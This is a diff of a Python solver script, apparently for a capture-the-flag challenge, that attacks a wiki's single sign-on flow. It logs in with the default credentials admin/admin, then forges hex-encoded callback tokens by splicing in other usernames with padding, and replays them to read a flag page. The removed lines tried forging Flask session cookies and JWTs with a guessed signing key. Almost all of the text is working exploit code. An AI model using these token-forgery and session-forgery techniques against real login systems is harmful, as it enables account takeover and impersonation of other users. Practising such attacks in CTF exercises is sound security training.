@@ -4,70 +4,55 @@ sys.path.append(str(Path(__file__).resolve().parent.parent))
 from utils import get_session, find_flag
 
 from bs4 import BeautifulSoup
-import jwt
-from flask import Flask
-from flask.sessions import SecureCookieSessionInterface
 
 BASE_URL = "https://easywiki.quoccacorp.com"
-SSO_URL = "https://quoccaid.quoccacorp.com"
+IDP_URL = "https://quoccaid.quoccacorp.com"
+ADMIN = "admin"
 
 class Solver:
     def __init__(self):
         self.session = get_session()
 
-    def _get_usernames(self) -> list[str]:
-        response = self.session.get(f"{SSO_URL}/users")
+    def get_usernames(self) -> list[str]:
+        response = self.session.get(f"{IDP_URL}/users")
         soup = BeautifulSoup(response.text, "html.parser")
-        return [user.text for user in soup.find_all('td')]
+        return [user.text for user in soup.find_all("td")]
+
+    def get_padding(self, length):
+        return "2b" * length
 
     def main(self):
         response = self.session.get(BASE_URL)
 
         soup = BeautifulSoup(response.text, "html.parser")
         form_element = soup.find("form")
-        sso_login_url = form_element["action"]
-        app_value = form_element.find("input", {"name": "app"})["value"]
+        idp_login_url = form_element.get("action")
+        redirect_app_value = form_element.find("input", {"name": "app"}).get("value")
 
-        response = self.session.post(sso_login_url,
-                                     params={"app": app_value},
-                                     data={"user": "admin", "password": "admin"},
+        response = self.session.post(idp_login_url,
+                                     params={"app": redirect_app_value},
+                                     data={"user": ADMIN, "password": ADMIN},
                                      allow_redirects=False)
+
         redirect_url = response.headers.get("Location")
-        easywiki_token = redirect_url.split("token=")[-1]
-        easywiki_token_decoded = bytes.fromhex(easywiki_token)
-        print("TrashPanda".encode().hex())
-        print(easywiki_token)
-        new_token = easywiki_token.replace("61646d696e2b2b2b2b2b", "TrashPanda".encode().hex())
-        print(new_token)
-        print(len(easywiki_token_decoded))
-        print(easywiki_token_decoded)
-        print(self._get_usernames())
-        response = self.session.get()
+        sso_callback_url = redirect_url.split("token=")[0]
+        easywiki_admin_token = redirect_url.split("token=")[1]
 
-        app = Flask(__name__)
-        app.secret_key = app_value
-        serializer = SecureCookieSessionInterface().get_signing_serializer(app)
-        signed_flask_token = serializer.dumps({"user": "TrashPanda"})
-        self.session.cookies.clear()
-        self.session.cookies.set("session", signed_flask_token)
-        response = self.session.get(BASE_URL)
-        print(response.text)
-        find_flag(response.text)
+        ADMIN_USERNAME_AND_PADDING_HEX = "61646d696e2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b"
+        token_start = easywiki_admin_token.split(ADMIN_USERNAME_AND_PADDING_HEX)[0]
+        token_end = easywiki_admin_token.split(ADMIN_USERNAME_AND_PADDING_HEX)[1]
 
+        for username in self.get_usernames():
+            max_username_len = len(ADMIN_USERNAME_AND_PADDING_HEX) // 2
+            username_len = len(username)
+            assert username_len <= max_username_len
 
-        # original_jwt = self.session.cookies.get_dict().get("session")
-        # jwt_payload_data: dict = jwt.decode(jwt=original_jwt, key=app_value, algorithms=["HS256"])
+            username_hex = username.encode().hex()
+            new_token = token_start + username_hex + self.get_padding(max_username_len - username_len) + token_end
 
-        # for user in self._get_usernames():
-        #     jwt_payload_data["user"] = user
-        #     print(jwt_payload_data)
-        #     new_jwt = jwt.encode(payload=jwt_payload_data, key=app_value, algorithm="HS256")
-        #     print(f"{new_jwt = }")
-        #     self.session.cookies.clear()
-        #     self.session.cookies.set("session", new_jwt)
-
-        #     response = self.session.get(SSO_URL)
-        #     print(response.text)
+            response = self.session.get(sso_callback_url, params={"token": new_token})
+            response = self.session.get(f"{BASE_URL}/The_Flag")
+            find_flag(response.text)
 
 if __name__ == "__main__":
     Solver().main()
